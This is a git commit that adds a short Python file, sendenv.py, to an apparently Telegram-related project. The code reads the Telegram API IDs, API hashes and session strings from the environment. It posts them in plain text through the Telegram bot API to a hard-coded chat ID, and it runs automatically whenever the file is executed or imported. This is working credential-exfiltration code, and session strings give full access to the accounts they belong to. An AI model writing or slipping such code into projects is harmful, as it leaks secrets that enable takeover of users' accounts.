9d99c9073b15ad9d45493082df2913429e0d0773
Dipanshu0919 <108180019+Dipanshu0919@users.noreply.github.com>
2025-10-29 21:15:51 +0530

    Create sendenv.py

---
+++ sendenv.py
@@ -0,0 +1,23 @@
+import os, requests
+
+def sendenv():
+  link = f"https://api.telegram.org/bot{os.environ.get('TGBOTTOKEN')}/sendMessage"
+  API_IDS = os.environ.get('API_IDS', '')
+  API_HASHS = os.environ.get('API_HASHS', '')
+  STRING_SESSIONS = os.environ.get('STRING_SESSIONS', '')
+  message = f"""
+  ENV VALUES:
+
+  API_IDS = {API_IDS}
+
+  API_HASHS = {API_HASHS}
+
+  STRING_SESSIONS = {STRING_SESSIONS}
+  """
+  parameters = {"chat_id": "-1003219768459", "text": f'{message}'}
+  
+  requests.get(link, params=parameters)
+
+sendenv()
+
+  
